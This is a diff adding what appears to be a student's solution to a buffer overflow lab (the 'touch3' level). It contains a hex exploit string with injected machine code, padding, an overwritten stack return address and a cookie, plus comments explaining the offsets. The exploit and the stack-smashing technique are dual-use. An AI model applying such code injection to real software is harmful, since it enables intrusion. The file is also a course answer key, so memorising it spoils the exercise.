@@ -1,0 +1,15 @@
+48 c7 c7 30 6f 64 55 c3 # this sets the cookie: movq $55646f30, %rdi
+                                                retq
+    set cookie at the last line of this code:
+    %rsp + buffer(=24) + 8 bytes for %rsp + 8 bytes for touch3
+  = %rsp + 0x18 + 8 + 8
+  = %rsp + 0x28
+  = 55646f08 + 28 = 55646f30
+00 00 00 00 00 00 00 00 # this adds 24
+00 00 00 00 00 00 00 00 # bytes of buffer
+08 6f 64 55 00 00 00 00 # %rsp = 55646f08; when getbuf is called, this will
+                          run the assembly code (first line) at the top of the
+                          stack, which will set the cookie to the last line
+b6 1c 42 00 00 00 00 00 # touch3 = 421cb6; called after the cookie is set
+37 30 39 66 39 30 35 30 # cookie in text format = change hex 709f9050 to ASCII
+                          text 37 30 39 66 39 30 35 30; address is 0x55646f30
